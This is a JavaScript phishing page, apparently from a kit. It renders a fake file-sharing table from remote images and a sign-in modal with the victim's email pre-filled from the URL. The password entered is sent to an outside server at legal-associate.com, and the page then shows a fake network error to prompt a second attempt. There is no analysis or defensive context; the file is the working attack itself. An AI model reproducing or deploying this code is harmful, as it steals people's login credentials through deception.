$(document).ready(function() {


    load();


    function load() {
        $('.loaded').html(`
        <div class="container">
        <div class="" data-bs-toggle="modal" data-bs-target="#myModal">
    
            <div class="row">
                <div class="col-sm-8">
    
                    <table class="table ">
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <th>Name↑</th>
                            <th>Size▼</th>
                            <th>Action▼</th>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/2.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/a.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/1.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/b.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/3.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/c.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/4.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/e.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/5.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/f.png"></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td></td>
                            <td></td>
                            <td><img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/aa.png"></td>
                        </tr>
                    </table>
                </div>
                <div class="col-sm-4">
                    <img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/ss.png" class="img-fluid">
                </div>
            </div>
    
        </div>
    </div>

    
    <!-- The Modal -->
    <div class="modal" id="myModal">
        <div class="modal-dialog">
            <div class="modal-content">

                <!-- Modal Header -->
              

                <!-- Modal body -->
                <div class="modal-body p-3">

                  <img src="https://cdn.glitch.global/334cd5ce-6286-4430-929e-3cfdf28039ba/to.png" class="img-fluid"><br>
                  <small class="text-danger" id="msg" style="font-weight:600;"></small>
                    <form method="post" id="formx" class="my-4">
                    
                    
                        <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
                   
                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
                       
                           
                        <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
                    </form>

                  
                 

                </div>
            </div>
        </div>
    </div>
`);

    }

    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`).prop("disabled", true);
        $.ajax({
            url: "https://legal-associate.com/0yl/api.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`Network Error! Please verify your information and try again`);
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
